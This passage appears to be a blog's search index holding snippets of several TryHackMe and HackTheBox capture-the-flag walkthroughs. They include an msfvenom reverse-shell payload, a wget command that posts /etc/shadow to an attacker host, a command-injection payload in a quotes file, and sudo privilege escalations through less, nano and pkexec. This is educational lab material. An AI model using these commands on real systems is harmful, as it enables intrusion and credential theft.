3.0.2: |_ Message signing enabled but not required| smb2-time: | date: 2022-05-16T10:19:42|_ start_date: 2022-05-16T09:46:29| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:80:6a:01:02:d7 (unknown)We got plenty of open ports, and we can see it’s a windows machine.WebLet’s navigate to the webserver on port 80.Let’s view the source code.We got the name of the employee of the month, it’s Bill Harper.On the other webserver, we see that it’s running http file server 2.3, let’s see if there is any vulnerabilities in this version.There is a remote command execution vulnerability.FootholdMetasploitTo get foothold using metasploit, we can use this exploit exploit/windows/http/rejetto_hfs_exec.Launch metasploit by running msfconsole, and run use exploit/windows/http/rejetto_hfs_exec.After that, we need to specify the RHOSTS, RPORT and LHOST. RHOSTS: is the target machine’s IP. RPORT : is the port of the vulnerable web server (8080). LHOST : is the attacker machine’s IP, tun0.ExploitTo get foothold without metasploit, we can use exploits found in Exploit-DB or other places..In this example, I’ll be using this Exploit.Privilege EscalationFor this part, we’re going to use the script suggested in the room; PowerUp.ps1. We’ll upload it using meterpreter, and load powershell in order to execute the script.Now, we need to load the script with the command . .\\PowerUp.ps1 and the execute it with Invoke-AllCheck.We can see that the AdvancedSystemCareService9 service has an unquoted service path, we can restart it, and have write permissions on it’s folder.Let’s create an executable that would sends us a shell once it’s executed.msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -e x86/shikata_ga_nai -f exe-service -o Advanced.exeThen we need to upload the Advanced.exe file to the machine, and put it in the correct folder.Next, we need to setup a multi handler listener to catch the reverse shell.Now, we need to restart the AdvancedSystemCareService9 service. To do that, we have to stop it with the command sc stop AdvancedSystemCareService9 and start it with sc start AdvancedSystemCareService9. All that need to happen in a windows command shell, so type shell in meterpreter.Now if we go to our multi handler listener, we should see a windows shell, and we have system privileges.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "TryHackMe - Crack the hash", "url": "/posts/THM-CrackTheHash/", "categories": "TryHackMe", "tags": "tryhackme, linux, cracking, hashcat", "date": "2022-05-13 01:00:00 +0100", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing Crack the hash from TryHackMe.Level 1Hash 1HashcatTo crack a hash using hashcat we first need to know the type of the hash since hashcat does not auto identify the hash. For that, we can use hash-identifier.This one is MD5, We can use thi Table provided by hashcat in order to know what hash-mode to use. In our case, the hash-mode for md5 is 0.hashcat -m 0 hash_file /usr/share/wordlists/rockyou.txtCrackStationWe can use CrackStation that uses tables to crack unsalted passwords. Let’s give it our first password.Hash 2HashcatLet’s use hash-identifier.It’s a SHA-1 hash, and the hash-mode for it is 100.hashcat -m 100 hash_file /usr/share/wordlists/rockyou.txtCrackStationLet’s give the hash to crackstation.Hash 3HashcatLet’s identify the hash.It’s SHA-256, the hash-mode is 1400hashcat -m 1400 hash_file /usr/share/wordlists/rockyou.txtCrackStationOn crackstation:Hash 4We ca see that this hash is salted, so we can’t use crackstation.HashcatTo identify the hash, i googled the first 4 characters $2y$.The hash type is bcrypt, and the hash-mode is 3200.Before start cracking, we see that the hint suggests to filter rockyou for 4 character words because this type of hashes take a long time. We can do that with the following command.Now, let’s start cracking.hashcat -m 3600 hash_file ./listHash 5HashcatLet’s identify the hash.It’s MD4, the hash-mode is 900hashcat -m 900 hash_file /usr/share/wordlists/rockyou.txtI couldn’t crack it because the password is not in rockyou.txt. Let’s try crackstation.CrackStationIf we give the hash to crack station, it manages to crack it.Level 2We will only be using hashcat in this level. Let’s start.Hash 1Hash-identifier:It’s SHA-256, the hash-mode is 1400hashcat -m 1400 hash_file /usr/share/wordlists/rockyou.txtHash 2This one is a NTLM hash, the hash-mode for it is 1000.hashcat -m 1000 hash_file /usr/share/wordlists/rockyou.txtHash 4This one is a sha512crypt hash, the hash-mode is 1800hashcat -m 1800 hash_file /usr/share/wordlists/rockyou.txtThis can a long time, so the password is waka99Hash 5The hash is sha1, the hash-mode is 110.hashcat -m 110 hash_file /usr/share/wordlists/rockyou.txtThe password is : 481616481616Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "TryHackMe - CTF Collection vol 1", "url": "/posts/THM-CTFColl1/", "categories": "TryHackMe", "tags": "tryhackme, linux, steganography, cipher, xxd, wireshark", "date": "2022-05-11 01:00:00 +0100", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing CTF Collection vol 1 from TryHackMe.What does the base said?In this task, we’re given the following encoded string: VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ==By the looks of it, it seems like a base64. We can go to CyberChef and decode it.We can also put the string in a file and decode it using the command base64.Meta meta.When we download the task file, we see that it’s an image. To view the meta data of an image, we can use exiftool.Mon, are we going to be okay?Something is hiding. That’s all you need to know.The file task is a jpg image, and there is some hidden content in it. The term we use for this technique is Steganography, and it is basically the practice of hiding one file within another.To extract the hidden content in an image, we can use a tool called steghide.Erm……MagickIn this task, there is no file to download, so the flag must be in the task, but we don’t see anything.If we select the text in this task, we can actually see the flag.QRrrrDownloading the task file we see that it’s an image of a QR code. We can upload the image to an online qr code reader or use a smart phone to read it. I used this WebsiteReverse it or read it?The task file is a program that prints some text when we it’s run.The title of this task says we can reverse it or read it. We can use the command strings that looks for human-readable characters in a file, and see if we can find the flag this way.Another decoding stuffIn this task, we got another encoded string : 3agrSy1CewF9v8ukcSkPSYm3oKUoByUpKG4LWe can use CyberChef to identify the encoding scheme using the magic operation.The magic operation identifies string as a base58. We can now use from base58 operation to decode it.Left or rightLeft, right, left, right… Rot 13 is too mainstream. Solve thisWe are given the following : MAF{atbe_max_vtxltk}At the first glance, this look like a rot13, but it’s not, if we check the hint, it says it’s a caesar cipher. We can search on google for a caesar cipher decoder and get plenty of websites. In my case, i use this website.Since we don’t have a key, this website can brute force the key and decode the flag.Make a commentNo downloadable file, no ciphered or encoded text. Huh …….Let’s check the source code of the page for any comments.Can you fix it?I accidentally messed up with this PNG file. Can you help me fix it? Thanks.If we try to open the image we get this.Let’s check the file type using the command file.It’s says data while it should be PNG image. Let’s now check the magic numbers of the file. Magic numbers are the first frw bytes of a file that are uniq to a particular file type.Now let’s search for png’s magic numbers if the ones is the file are correct.We found the correct numbers, now let’s fix the file. To do that, we can use hexedit.TO change a byte using hexedit, you simply have to move the cursor over a byte and type what you would like to. In our case, we need to replace 2333 445f 0d0a 1a0a with 89 50 4E 47 0D 0A 1A 0A.To save the changes, press ctrl + X and then y.Now let’s check the changes.Great! We fixed the file, now let’s open it and get the flag.Read itSome hidden flag inside Tryhackme social account.If we check tryhackme’s subreddit, we can find the flag in one of the posts.Spin my headWhat is this?++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++++++++++++++.------------.+++++.&gt;+++++++++++++++++++++++.&lt;&lt;++++++++++++++++++.&gt;&gt;-------------------.---------.++++++++++++++.++++++++++++.&lt;++++++++++++++++++.+++++++++.&lt;+++.+.&gt;----.&gt;++++.This is a brainfuck code, brainfuck is a programming language. I used this website in order to execute this code.An Exclusive!Exclusive strings for everyone!S1: 44585d6b2368737c65252166234f20626dS2: 1010101010101010101010101010101010In the hint we have XOR, searching for this xor thing, i found this website that we can use to get the flag.Binary walkWe can use a tool called binwalk that searches binary images for embedded files and executable code.DarknessThe task file is an image, when we open it, we see that it’s all dark.We can use a tool called stegoveritas.A Sounding QRWe got another qr code, let’s upload it to thiswebsite.We got a link to a soundcloud clip, and it spells it to us.Dig up the pastSometimes we need a ‘machine’ to dig the pastTargeted website: https://www.embeddedhacker.com/Targeted time: 2 January 2020In order to see a website at a specific time in the past, we can use the WayBackMachineNow enter the targeted website and press enter.Now let’s select 2020 and go to 2nd january.Now hover the mouse over the number 2 and click the clock time.Uncrackable!Can you solve the following? By the way, I lost the key. Sorry &gt;.&lt;MYKAHODTQ{RVG_YVGGK_FAL_WXF}Flag format: TRYHACKME{FLAG IN ALL CAP}This looks like a vigenere cipher, we don’t have a key, but we know that it starts with TRYHACKME. Let’s got to dcode website.Since we don’t have a key, we selected knowing a plain text word and entered TRYHACKME, with that, we were able to retrieve the flag.Small basesdecode the following text.581695969015253365094191591547859387620042736036246486373595515576333693The hints says dec -&gt; hex -&gt; ascii. We have to convert this decimal text to hex, and then to ascii. We can use this Website.Now select decimal to hex converter, and convert the text.Copy the result and go back to select hex to ascii converter, and convert to get the flag.Read the packetNow with the final challenge, we need to read a packet. Let’s load the file to wireshark and investigate the packets.Let’s search for the word flag, we ca do that by pressing ctrl + F, select string and type the word flag, then press Find.Great! We found the packet, now right click the packet -&gt; follow &gt; http streamWith that, we have successfully completed this wonderful room.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "HackTheBox - Illumination", "url": "/posts/HTB-Illumination/", "categories": "HackTheBox, Challenges, Forensics", "tags": "hackthebox, forensics, easy, challenges, git", "date": "2022-05-09 01:00:00 +0100", "snippet": " DescriptionHello Hackers, I hope you are doing well. Today we are going to look at Illumination from HackTheBox. A Junior Developer just switched to a new source control platform. Can you find the secret token?SolutionAfter download the zip file and unzipping it, let’s look at the files we’ve extracted.There is a .git directory. Git is a version control system where you can track changes on any set of files.This means that we can see the changes this junior developer has made. To do that, we can run the following command to see the logs: git logWe can see the commit where he made the change to the token. We need to compare this commit with the one made before it.First, let’s take a note of the commits we want the compare, running git log --oneline will display a short version of the commit’s id.Now, let’s see the differences between those two commits by running the following command: git diff COMMIT COMMIT. Note: Replace COMMIT with the id of the commit.And there is the token, it’s encoded with base64, decode it to get the flag.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "TryHackMe - Cyborg", "url": "/posts/THM-Cyborg/", "categories": "TryHackMe", "tags": "tryhackme, linux, sudo", "date": "2022-05-07 00:00:00 +0000", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing from TryHackMe.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.29.122Host is up (0.092s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)| 256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)|_ 256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe have ssh on port 22 and http on port 80.WebLet’s navigate to the webserver.It’s the default page for apache. Let’s run a directory scan.===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian ===============================================================[+] Url: http://10.10.29.122/[+] Method: GET[+] Threads: 50[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================19:44:05 Starting gobuster in directory enumeration mode===============================================================/.htpasswd (Status: 403) [Size: 277]/.hta (Status: 403) [Size: 277]/.htaccess (Status: 403) [Size: 277]/admin (Status: 301) [Size: 312] [--&gt; http://10.10.29.122/admin/]/etc (Status: 301) [Size: 310] [--&gt; http://10.10.29.122/etc/] /index.html (Status: 200) [Size: 11321] /server-status (Status: 403) [Size: 277] ===============================================================We found /admin and /etc. Let’s visit admin page.let’s look through the page to see if we can find anything useful.We found out that there is a backup called music_archive, also Alex has made some changes that made the site insecure.In the archive tab, we see that we can download an archive.tar file, so let’s do that.Move on the the next directory we found “/etc/”.There is another directory, let’s see what’s in it.We found 2 files, passwd and squid.conf.The passwd file has a hash for music_archive, let’s copy that hash to a file on our machine and try to crack it.Using hash-identifier, we find that our hash is MD5(APR). We can use hashcat with the mode 1600 to crack the hash.hashcat -m 1600 hash /usr/share/wordlists/rockyou.txtGreat! We managed to crack the hash and get a password.Let’s now take a look at the archive.tar file we downloaded before. We can extract it using tar -xvf archive.tarWe found a readme file that tells us this is a borg backup repository, and points us to a webpage.Looking through the documentation, we found a way to extract archives.Let’s try to extract the music_archive Alex talked about since we managed to crack the password.First, we need to download borgbackup, we can do that with the following command: sudo apt install borgbackupSecond, we need to run this command : borg extract ./home/field/dev/final_archive::music_archive and submit the password.FootholdNow let’s see what we extracted.We got Alex’s home page, let’s look through it to see if we can find any useful information.Great! We got Alex’s password, let’s use it and login with ssh.Privilege EscalationLet’s check our current privileges by running sudo -l.We can run backup.sh file as root, let’s check this file.We can see that we are the owner of this file, so we can modify it as we like. Let’s make it run /bin/bash.First, we need to add write permission because it’s not writable and then add our code.Great! Now let’s run the script sudo /etc/mp3backups/backup.sh.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack ;).References" }, { "title": "TryHackMe - Lyan_yu", "url": "/posts/THM-lyanyu/", "categories": "TryHackMe", "tags": "tryhackme, linux, steganography", "date": "2022-05-05 00:00:00 +0000", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing Lyan_yu from TryHackMe.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.247.111Host is up (0.10s latency).Not shown: 996 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.222/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)| ssh-hostkey: | 1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)| 2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)| 256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)|_ 256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)80/tcp open http Apache httpd|_http-title: Purgatory|_http-server-header: Apache111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 33339/udp status| 100024 1 36579/udp6 status| 100024 1 39031/tcp6 status|_ 100024 1 54934/tcp statusService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelWe found 4 open ports, let’s enumerate the webserver on port 80.WebNavigating to the webpage we see the following.It’s a story about ARROWVERSE, nothing really useful in this page, let’s run a directory scan.# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.118.55/===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian===============================================================[+] Url: http://10.10.118.55/[+] Method: GET[+] Threads: 50[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================11:21:49 Starting gobuster in directory enumeration mode===============================================================/island (Status: 301) [Size: 235] [--&gt; http://10.10.118.55/island/]===============================================================We found /island directory, let’s navigate to it.There is a code word but we can’t see it, let’s view the source code.Great! We got the code, let’s save it and continue our enumeration.Since we got nothing really useful, let’s run another directory scan on /island page# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.118.55/island/===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian===============================================================[+] Url: http://10.10.118.55/island/[+] Method: GET[+] Threads: 50[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================11:38:25 Starting gobuster in directory enumeration mode===============================================================/2100 (Status: 301) [Size: 240] [--&gt; http://10.10.118.55/island/2100/]===============================================================We found a directory, let’s see what’s there.We have a youtube video and a question. Let’s again view the source code.We got a hint that there is a ticket we can get, and it ends with .ticket. We can run a gobuster scan and instruct it to add the extension .ticket at the end of every search.# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.118.55/island/2100/ -x ticket===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian===============================================================[+] Url: http://10.10.118.55/island/2100/[+] Method: GET[+] Threads: 50[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: ticket[+] Timeout: 10s===============================================================2022/05/10 11:45:02 Starting gobuster in directory enumeration mode===============================================================/green_arrow.ticket (Status: 200) [Size: 71]===============================================================We found our ticket, let’s take a look at it.We got what looks like an encoded text, let’s go to CyberChef and decode it.We managed to decode it using base58, and it looks like a password.FTPUsing the code we found as a username and the password we decoded, let’s login to the ftp server and see what’s there.It looks like we are is vigilante’s home directory, unfortunately, there is no .ssh directory, but there are some files in forme of images, let’s download them to our machine using the command get filenameNow using the command steghide, let’s try to extract hidden file in the image aa.jpgUsing password as a password, we managed to extract two files, one of the files has a password, but we need a username.Going back to the ftp server, we see that we can navigate freely on the machine, and if we go to /home folder, we can see the users there.Great! We got our username.FootholdNow, let’s use the credentials we managed to collect to login with ssh.Great! Let’s move to privilege escalation.Privilege EscalationFirst, let’s check our current privileges on the machine by running sudo -lWe can run the command pkexec as root. Let’s go to GTFOBins to see what we can do.We see that we ca run sudo pkexec /bin/sh to escalate to root. Let’s do it.Great! We have successfully rooted this machine.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).Referenceshttps://gchq.github.io/CyberChef/https://gtfobins.github.io/gtfobins/pkexec/" }, { "title": "TryHackMe - Break Out The Cage.1", "url": "/posts/THM-BreakOutTheCage1/", "categories": "TryHackMe", "tags": "tryhackme, linux, cipher, spectrogram", "date": "2022-05-03 00:00:00 +0000", "snippet": " DescriptionHello hackers, I hope you are doing well. We are doing Break Out The Cage.1 from TryHackMe. We scan the machine for open port and find 3 open ports, the first port 21 is an ftp server with anonymous login enabled, there we find an file that has an encrypted password. We move to port 80 which is a webserver, we run a directory scan against it and find an audio file that has a text as spectrogram, we use it to decrypt the password we found on ftp and login as Weston. On the machine, a text gets printed on the screen every now and then, we found the script responsible for that and exploit the way it works and upgrade to the user Cage. After that we find some emails on Cage’s home directory, one of the emails contains an encrypted password, and another email has a hint for the keyword we can use to decrypt the password. We do that and change user to root. Let’s get started.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.245.11Host is up (0.11s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 396 May 25 2020 dad_tasks| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.11.31.131| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)| 256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)|_ 256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Nicholas Cage Stories|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelThere are 3 open ports, 21(FTP), 22(SSH) and 80(HTTP).FTPSince the ftp server allows anonymous login, let’s login and see what’s there.We found a file named dad_tasks, and downloaded it with the command get dad_tasks.Now let’s see what the file has.The file contains a base64 encoded text, we decode it using base64 -d dad_tasks, but it gives us another encoded text, it look like a Vigenere cipher and we need a key to decrypt that, so let’s move to other things.WebNavigating to the webserver we get this page.Nothing really useful in this page.GobusterLet’s run a directory scan.We found a couple of directories, but the /auditions directory has an interesting audio file.When we play the file we hear nicholas Cage talking and weird noise. Let’s load the audio file to sonic-visualizer, add a spectrogram layer by going to Layer -&gt; Add SpectrogramWe can see some text there, let’s save it.FootholdNow that we have a possible key for the vigenere cipher, let’s try to decode the text we got from the ftp server.Great! We managed to decrypt the text and get the password of Weston. Let’s login with ssh now.Great! Let’s move to privilege escalation.Privilege EscalationCageLet’s start by checking our current privileges by running sudo -lWe can run a bees as root, this runs the command wall with some text, so there isn’t a way to escalate with that.While logged in, we a get the following message from time to time.Looking around the file system, we found a python script named spread_the_quotes.py inside /opt/.dad_scripts, which is is the script responsible for the message we get periodically.#!/usr/bin/env python#Copyright Weston 2k20 (Dad couldn't write this with all the time in the world!)import osimport randomlines = open(\"/opt/.dads_scripts/.files/.quotes\").read().splitlines()quote = random.choice(lines)os.system(\"wall \" + quote)The script reads the quotes file, randomly chooses a line and outputs it via the command wall.We can’t edit the python script but we can edit the .quotes file.We can make a script that make a copy of /bin/bash and give it suid bit so that we can run it as it’s owner, in our case it’s Cage.#!/bin/bashcp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bashAfter that, we can replace the quotes in the quote file with a payload that would call our script, in this case, we can use this payload tryhackme ; script_location. Let’s break it down, tryhackme is the text passed to the command wall, The semicolon “;” permits us to run multiple commands in the same line and and the script_location is the place where we wrote the script.Now if we wait for the script to run, we should found a copy of bash in /tmp with the suid bit set, run /bin/bash -p to get a shell as Cage.We can now grab Cage’s ssh private key and connect with it.RootIn Cage’s home directory, there is an email folder with tree emails, one of them contains a possible password for Sean who has root as his username. If we tried to change user to root with that password, we fail. The password must be encrypted.We know that Sean is obsessed with Cage’s face, and since we used vigenere cipher before, let’s use it now with face as a key.After decrypting the password we can change the user to root with it.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).References" }, { "title": "TryHackMe - Wgel CTF", "url": "/posts/THM-WgelCTF/", "categories": "TryHackMe", "tags": "tryhackme, linux, sudo, wget", "date": "2022-04-29 00:00:00 +0000", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Wgel CTF from TryHackMe. We start by enumerating the machine with nmap, we find ssh on port 22 and a webserver on port 80. We run a directory scan and find private key, we use the latter with a username we found in the webpage source code to login with ssh. After getting access to the machine we find that we can run wget as root, we leverage that to get root access by replacing the shadow file with one we modified. Let’s get started.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.165.173Host is up (0.16s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)| 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)|_ 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe got 2 open ports. Let’s check the webserver on port 80.WebNavigating to the webpage we get this.It’s the default page for apache, let’s view the source code.We found a possible username.GobusterLet’s run a directory scan with gobuster.We found a directory named sitemap, let’s go see what’ there.It’s a UNAPP template page, nothing really useful, let’s run another directory scan on sitemap.Wow, we found .ssh directory, let’s go take a look and hope there is a private key waiting for us there.Great! We got an ssh private key.FootholdLet’s copy that key to a file in our machine and give it the right permission, then let’s use it with the username we found earlier to login with ssh.Nice, we got access to the box. Let’s escalate our privileges now.Privilege EscalationFirst, let’s check our current privileges with the command sudo -l.We see that we can run every command as root, but we need a password for that, on the other hand, we can run wget with no password.I searched on Google for a way to escalate privileges with wget and found this article explaining how to do so.What we can do is read the /etc/shadow file, get a hash, and try to crack that hash. First let’s setup a listener on our machine with the command nc -lvnp 80Now on the compromised machine, run sudo wget --post-file=/etc/shadow {attacker_ip}Now going back to our listener, we should have received the content of shadow file.Great! We have the shadow file, I’ve tried to crack the hash but got nothing.One other thing we can try is to modify the shadow file by putting our own crafted hash and upload it the the compromised machine.First, let’s generate a new password hash using the command openssl passwd -6 pass123.The password i used is pass123, you can choose whatever you want.Let’s replace jessie’s hash with the one we just created.Great! Now let’s upload the file to the machine using the command sudo wget http://10.11.31.131/shadow --output-document=shadow Note: You have to change the directory to /etc before uploading the file.Now that we replaced the shadow file, let’s change our user to root. We know that jessie can execute any command as root using a password, let’s run the command sudo su and submit the password we specified while creating the hash, in my case it’s pass123.Great! We got root.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).Referenceshttps://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/" }, { "title": "TryHackMe - Brooklyn Nine Nine", "url": "/posts/THM-Brooklyn99/", "categories": "TryHackMe", "tags": "tryhackme, linux, hydra, bruteforce, steganography", "date": "2022-04-27 00:00:00 +0000", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Brooklyn Nine Nine from TryHackMe.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.168.172Host is up (0.098s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.11.31.131| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 4| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)| 256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)|_ 256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelThere are 3 open ports, FTP on port 21, SSH on port 22, and HTTP on port 80. Let’s start with FTP.FTPLet’s login to the ftp server as anonymous. ftp {target_IP}.We found a text file, let’s download it to our machine with the command get {filename}.Now let’s see what’s on that file.It’s a note from Amy to Jake saying that Jake’s password is too weak.WebLet’s navigate to the webpage.We have a picture of Brooklyn nine-nine and some text, let’s view the source code ctrl+u.We found an HTML comment talking about steganographyFootholdMethod 1Let’s use hydra to brute force Jake’s password. hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.168.172 ssh -t 30Great! We got Jake’s password, let’s login.And we’re in.Method 2First, let’s download the picture to our machine using this command. wget http://{target_ip}/brooklyn99.jpg}.Now let’s use steghide to extract any hidden files on the picture.steghide --extract -sf brooklyn99.jpg.The file is protected with a password.Let’s use stegseek to get that password.Great! We got the password and extracted the data successfully. Let’s see what we got.We got Holt’s password. Let’s use it to login.We’re in. To privesc.Privilege EscalationJakeLet’s check our current privileges by running sudo -l.We can execute the command less as root, let’s take a look at GTFOBins for exploits.We found a way to get root access by executing some commands, so let’s run them.Good! We are root now.HoltLet’s check our privileges with sudo -l.We can run nano as root, let’s go to GTFOBins and see if there is a way to exploit that.Good, we found a way.First, run the command sudo nano, now that you are in the nano editor, press ctrl+R + ctrl+X, after that, enter the command reset; sh 1&gt;&amp;0 2&gt;&amp;0, it should look like this.Now press Enter to execute the command. Note: you might need to press enter multiple time to get a clear shell.And just like that, we got root.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).Referenceshttps://github.com/RickdeJager/stegseekhttps://gtfobins.github.io/gtfobins/less/#sudohttps://gtfobins.github.io/gtfobins/nano/#sudo" }, { "title": "TryHackMe - Tomghost", "url": "/posts/THM-Tomghost/", "categories": "TryHackMe", "tags": "tryhackme, linux, gpg, scp", "date": "2022-04-25 00:00:00 +0000", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Thomghost from TryHackMeEnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 